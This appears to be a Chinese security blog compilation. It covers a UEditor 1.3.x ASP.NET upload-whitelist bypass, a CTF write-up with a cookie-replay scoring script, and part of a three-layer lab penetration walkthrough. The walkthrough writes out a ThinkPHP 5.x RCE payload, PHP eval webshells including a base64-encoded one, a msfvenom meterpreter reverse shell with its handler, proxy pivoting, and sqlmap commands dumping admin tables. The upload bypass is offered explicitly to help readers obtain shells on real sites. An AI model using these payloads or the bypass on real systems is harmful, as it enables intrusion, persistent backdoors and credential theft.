<p><img src="https://img-blog.csdnimg.cn/20201012203654733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
本意是对.net进行代码审计，发现是否存在安全漏洞（虽然通过搜索引擎并未找到这种信息），但是有意思的是在我审计出来之前，先前开启的burp的后缀fuzz已经有所发现。<br>
框架使用的是白名单，并重命名，但是代码层面存在两点不足。</p>
<p>第一点是获取后缀的函数是自定义的，并且存在逻辑问题。这部分代码存在于</p>
<pre><code class="prism language-c">\ueditor3\net\Uploader<span class="token punctuation">.</span>cs<span class="token punctuation">:</span><span class="token number">190</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012210641144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
简单来说，该函数就是以“.”为分割符，得到一个文件名信息的字符型数组，并获取数组最后一个值，在前面添加‘.’后作为后缀返回。这里存在一个问题，如果所传的字符不存在点字符，文件名以点分割获取的数组只有一个值也是最后一个值，如，‘pdf’。该函数最后返回的值将是‘.pdf’。从而绕过白名单的检查。</p>
<p><img src="https://img-blog.csdnimg.cn/20201012210654538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
另一个问题就是文件名的生成过程，文件名是随机生成的，但是随机生成的决定参数是前端fileNameFormat传入，格式是{filename}{rand:6}，最简单办法就是直接将该参数改为字符串，不会被正则匹配，直接拼接入文件名。同时此时获取后缀的函数使用asp.net自带的获取后缀的方法Path.GetExtension(filename)，（这里只想说不知道开发是怎么想的），该函数获取pdf中后缀的值为空。所以最后保存的文件名只由format决定。</p>
<p><img src="https://img-blog.csdnimg.cn/20201012210705793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这里完成了对1.3.6版本的分析，同时我也搭建了jsp、php本部的和v1.4.3的ueditor对应的三种语言的靶场，经查看，这几种均使用语言自带的获取后缀的函数。所以该利用方法也只能在v1.3.x的aspx环境下复现。</p>
<p><strong>总结</strong></p>
<p>v1.3.x的市场覆盖率确实较1.4.3低了很多，希望能帮碰到该环境的老哥们多拿一个shell吧！如有，错误和不足之处，望多多斧正</p>
<hr>
<h2><a id="1311__gameapp_4381"></a>13.11 “数字经济”云安全共测大赛初赛 gameapp题目解析</h2>
<p>打开网页，看到你能得到99999分吗<br>
<img src="https://img-blog.csdnimg.cn/20201012212204105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
看到还有个附件 下载下来为一个apk文件<img src="https://img-blog.csdnimg.cn/20201012212213985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在夜神模拟器里面安装<br>
<img src="https://img-blog.csdnimg.cn/20201012212259647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
打开app<br>
<img src="https://img-blog.csdnimg.cn/20201012212310715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
玩了下就输了。。。<br>
<img src="https://img-blog.csdnimg.cn/20201012212320949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
考虑了一下，达到99999分，我这样手残党是玩不动的</p>
<p><img src="https://img-blog.csdnimg.cn/20201012212334716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
夜神模拟器中修改代理<br>
再点开请求<br>
<img src="https://img-blog.csdnimg.cn/20201012212350739.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201012212344832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
打爆一只飞机 发了个请求<img src="https://img-blog.csdnimg.cn/20201012212406599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
打爆第二只飞机 发了个请求</p>
<hr>
<p>分析session里面的 jwt<br>
<img src="https://img-blog.csdnimg.cn/20201012212427458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012212433317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
首先尝试了破解jwt密匙，但是跑了好久都没跑出来</p>
<p><img src="https://img-blog.csdnimg.cn/20201012212447220.png#pic_center" alt="在这里插入图片描述"></p>
<p>然后看了下把session复制过来重新发，可以持续加分数</p>
<pre><code class="prism language-c">import requests
url <span class="token operator">=</span> <span class="token string">'http://121.40.219.183:9999/score/'</span>

body <span class="token operator">=</span> <span class="token string">"OAJZiuZqnBwNco1SD+XLYENOq1fnZSecbtn4aReWWJGwNarE2XqwabMdBJAwISqDOkfP4KiS5ULlIjeDUZppTcvFMMnopd2VU7rAmFMv/rsfZg/Hc0qgNQ2D9NwAODle8JXbREA4Z/nkQYvfwiRJ+yZf51YsAty9GJSwozRbcfw="</span>
cookie <span class="token operator">=</span> <span class="token string">"session=eyJwbGF5ZXIiOiJhZG1pbiIsInNjb3JlIjoxMTIwMjd9.XYRfFw.y7P5sCLQOiLmOu9sNKfQTc0Gdqk; HttpOnly; Path=/"</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token function">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> <span class="token string">'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G955F Build/JLS36C)'</span><span class="token punctuation">,</span> <span class="token string">'Cookie'</span><span class="token punctuation">:</span> cookie<span class="token punctuation">}</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> body<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>
    cookie <span class="token operator">=</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span>
    <span class="token macro property">#print(cookie)</span>
    <span class="token function">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012212503135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
成功跑出flag</p>
<hr>
<h2><a id="1312_CFS_4432"></a>13.12 CFS三层靶机搭建及其内网渗透-附靶场环境</h2>
<pre><code class="prism language-c">链接<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>pan<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>s<span class="token operator">/</span><span class="token number">1</span>ob4OrHywpaHhj7FncOgVBw 
密码<span class="token punctuation">:</span> <span class="token number">8</span>jff
解压码：teamssix<span class="token punctuation">.</span>com
</code></pre>
<p>参考下吧–我看完了挺简单的，我目前没时间复现–dayu。。。</p>
<p><strong>0x00 前言</strong></p>
<p>最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。</p>
<p>在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。</p>
<p><strong>0x01 环境搭建</strong></p>
<p>简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示<br>
<img src="https://img-blog.csdnimg.cn/20201012213551148.png#pic_center" alt="在这里插入图片描述"><br>
Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。  图 2<br>
<img src="https://img-blog.csdnimg.cn/2020101221381995.png#pic_center" alt="在这里插入图片描述"><br>
如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。</p>
<p>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。</p>
<hr>
<p><strong>0x02 Target1</strong></p>
<p>a、获取shell</p>
<p>1、先用nmap扫描一下Target1</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># nmap <span class="token operator">-</span>T4 <span class="token operator">-</span>O <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>
Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at <span class="token number">2019</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">04</span> <span class="token number">05</span><span class="token punctuation">:</span><span class="token number">51</span> EDT
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>
Host is up <span class="token punctuation">(</span><span class="token number">0.00042</span>s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>
Not shown<span class="token punctuation">:</span> <span class="token number">994</span> filtered ports
PORT     STATE  SERVICE
<span class="token number">20</span><span class="token operator">/</span>tcp   closed ftp<span class="token operator">-</span>data
<span class="token number">21</span><span class="token operator">/</span>tcp   open   ftp
<span class="token number">22</span><span class="token operator">/</span>tcp   open   ssh
<span class="token number">80</span><span class="token operator">/</span>tcp   open   http
<span class="token number">888</span><span class="token operator">/</span>tcp  open   accessbuilder
<span class="token number">8888</span><span class="token operator">/</span>tcp open   sun<span class="token operator">-</span>answerbook
MAC Address<span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>C<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token punctuation">:</span>A6<span class="token punctuation">:</span><span class="token number">6</span>D <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type<span class="token punctuation">:</span> general purpose
Running<span class="token punctuation">:</span> Linux <span class="token number">3.</span>X<span class="token operator">|</span><span class="token number">4.</span>X
OS CPE<span class="token punctuation">:</span> cpe<span class="token punctuation">:</span><span class="token operator">/</span>o<span class="token punctuation">:</span>linux<span class="token punctuation">:</span>linux_kernel<span class="token punctuation">:</span><span class="token number">3</span> cpe<span class="token punctuation">:</span><span class="token operator">/</span>o<span class="token punctuation">:</span>linux<span class="token punctuation">:</span>linux_kernel<span class="token punctuation">:</span><span class="token number">4</span>
OS details<span class="token punctuation">:</span> Linux <span class="token number">3.10</span> – <span class="token number">4.11</span>
Network Distance<span class="token punctuation">:</span> <span class="token number">1</span> hop

OS detection performed<span class="token punctuation">.</span> Please report any incorrect results at https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span>
Nmap done<span class="token punctuation">:</span> <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned in <span class="token number">8.97</span> seconds
</code></pre>
<p>可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。</p>
<p>2、既然存在http服务，那就用浏览器打开看看是个什么<br>
<img src="https://img-blog.csdnimg.cn/20201012213906506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p>
<pre><code class="prism language-c"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span>function<span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>phpinfo<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012213930750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些</p>
<p><img src="https://img-blog.csdnimg.cn/20201012213936240.png#pic_center" alt="在这里插入图片描述"><br>
5、在工具中命令是可以被执行的，那就getshell吧</p>
<p><img src="https://img-blog.csdnimg.cn/20201012213952244.png#pic_center" alt="在这里插入图片描述"></p>
<p>6、昂~ getshell失败，没关系，直接echo写入一句话</p>
<pre><code class="prism language-c">echo “<span class="token operator">&lt;</span><span class="token operator">?</span>php @<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>‘TeamsSix’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>” <span class="token operator">&gt;</span> shell<span class="token punctuation">.</span>php
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012213958829.png#pic_center" alt="在这里插入图片描述"><br>
7、通过浏览器访问，查看shell.php是否上传成功<br>
<img src="https://img-blog.csdnimg.cn/20201012214010346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br>
<img src="https://img-blog.csdnimg.cn/2020101221402118.png#pic_center" alt="在这里插入图片描述"><br>
之前：&lt;?php @eval($_POST[‘TeamsSix’]);?&gt;<br>
之后：&lt;?php @eval([‘TeamsSix’]);?&gt;</p>
<p>9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试</p>
<p><img src="https://img-blog.csdnimg.cn/20201012214031439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012214039776.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012214045980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">echo “PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs<span class="token operator">/</span>Pg<span class="token operator">==</span>” <span class="token operator">|</span> base64 <span class="token operator">-</span>d <span class="token operator">&gt;</span> shell<span class="token punctuation">.</span>php
</code></pre>
<p>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br>
<img src="https://img-blog.csdnimg.cn/20201012214100486.png#pic_center" alt="在这里插入图片描述"></p>
<p>b、设置代理<br>
注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。</p>
<p>1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># ifconfig
root@kali<span class="token punctuation">:</span><span class="token operator">~</span># msfvenom <span class="token operator">-</span>p linux<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.113</span> LPORT<span class="token operator">=</span><span class="token number">6666</span> SessionCommunicationTimeout<span class="token operator">=</span><span class="token number">0</span> SessionExpirationTimeout<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">-</span>f elf <span class="token operator">&gt;</span>shell<span class="token punctuation">.</span>elf
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214116429.png#pic_center" alt="在这里插入图片描述"><br>
2、在kali中配置运行监听模块</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># msfconsole
msf5 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload linux<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set lhost <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set lport <span class="token number">6666</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214131446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p>
<pre><code class="prism language-c"><span class="token punctuation">(</span>www<span class="token punctuation">:</span><span class="token operator">/</span>www<span class="token operator">/</span>wwwroot<span class="token operator">/</span>ThinkPHP<span class="token operator">/</span>public<span class="token punctuation">)</span> $ chmod <span class="token number">777</span> shell<span class="token punctuation">.</span>elf
<span class="token punctuation">(</span>www<span class="token punctuation">:</span><span class="token operator">/</span>www<span class="token operator">/</span>wwwroot<span class="token operator">/</span>ThinkPHP<span class="token operator">/</span>public<span class="token punctuation">)</span> $ <span class="token punctuation">.</span><span class="token operator">/</span>shell<span class="token punctuation">.</span>elf
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214146240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p>
<pre><code class="prism language-c">run autoroute <span class="token operator">-</span>s <span class="token number">192.168</span><span class="token number">.22</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
run autoroute <span class="token operator">-</span>p
</code></pre>
<p>这一步也可以使用run post/multi/manage/autoroute自动添加路由<br>
<img src="https://img-blog.csdnimg.cn/20201012214206232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p>
<pre><code class="prism language-c">msf5 <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>server<span class="token operator">/</span>socks4a
msf5 <span class="token function">auxiliary</span><span class="token punctuation">(</span>server<span class="token operator">/</span>socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set srvport <span class="token number">2222</span>
msf5 <span class="token function">auxiliary</span><span class="token punctuation">(</span>server<span class="token operator">/</span>socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options
msf5 <span class="token function">auxiliary</span><span class="token punctuation">(</span>server<span class="token operator">/</span>socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214220203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># vim <span class="token operator">/</span>etc<span class="token operator">/</span>proxychains<span class="token punctuation">.</span>conf
加入以下内容：
socks4     <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.113</span>     <span class="token number">2222</span>
</code></pre>
<p>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># proxychains4 nmap <span class="token operator">-</span>Pn <span class="token operator">-</span>sT <span class="token number">192.168</span><span class="token number">.22</span><span class="token number">.22</span>
<span class="token operator">-</span>Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。
<span class="token operator">-</span>sT：扫描TCP数据包已建立的连接connect
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214256640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x03 Target2</strong></p>
<p>a、获取shell</p>
<p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br>
<img src="https://img-blog.csdnimg.cn/20201012214324185.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012214329133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示</p>
<p><img src="https://img-blog.csdnimg.cn/20201012214338734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012214348997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012214353597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧<br>
<img src="https://img-blog.csdnimg.cn/20201012214405289.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># proxychains4 sqlmap <span class="token operator">-</span>u “http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.22</span><span class="token number">.22</span><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>vul<span class="token operator">&amp;</span>keyword<span class="token operator">=</span><span class="token number">1</span>” <span class="token operator">-</span>p keyword
</code></pre>
<p>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p>
<p><img src="https://img-blog.csdnimg.cn/20201012214413228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><code>root@kali:~# proxychains4 sqlmap -u “http://192.168.22.22/index.php?r=vul&amp;keyword=1” -p keyword –dbs</code></p>
<p>5、看看bagecms下有哪些表</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># proxychains4 sqlmap <span class="token operator">-</span>u “http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.22</span><span class="token number">.22</span><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>vul<span class="token operator">&amp;</span>keyword<span class="token operator">=</span><span class="token number">1</span>” <span class="token operator">-</span>p keyword <span class="token operator">-</span>D bagecms –tables
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012214432956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
6、看一下bage_admin下的内容</p>
<pre><code class="prism language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># proxychains4 sqlmap <span class="token operator">-</span>u “http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.22</span><span class="token number">.22</span><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>r<span class="token operator">=</span>vul<span class="token operator">&amp;</span>keyword<span class="token operator">=</span><span class="token number">1</span>” <span class="token operator">-</span>p keyword <span class="token operator">-</span>D bagecms <span class="token operator">-</span>T bage_admin –columns
</code></pre>
